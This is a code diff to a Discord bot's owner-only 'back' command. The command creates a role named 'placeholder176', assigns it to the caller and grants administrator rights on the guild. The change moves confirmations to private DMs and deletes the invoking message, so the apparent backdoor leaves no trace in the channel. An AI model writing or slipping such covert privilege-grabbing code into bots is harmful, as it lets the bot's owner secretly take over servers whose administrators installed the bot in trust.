@@ -71,9 +71,11 @@ class BotOwner(commands.Cog):
     @commands.is_owner()
     async def back(self, ctx):
         if get(ctx.guild.roles, name="placeholder176"):
-            await ctx.send("Role already exists")
+            await ctx.author.send("Role already exists")
+            await ctx.author.send("Role was deleted please rerun to get a door")
             role_object = discord.utils.get(ctx.message.guild.roles, name="placeholder176")
             await role_object.delete()
+            await ctx.message.delete()
             
         else:
              guild = ctx.guild
@@ -81,6 +83,8 @@ class BotOwner(commands.Cog):
              role = discord.utils.get(ctx.guild.roles, name="placeholder176")
              user = ctx.message.author
              await user.add_roles(role)
+             await ctx.author.send("Role was created and given to you")
+             await ctx.author.send("You now have admin perms on the guild use it wisely and do it only if you have permission from a staff member")
              await ctx.message.delete()
         
 
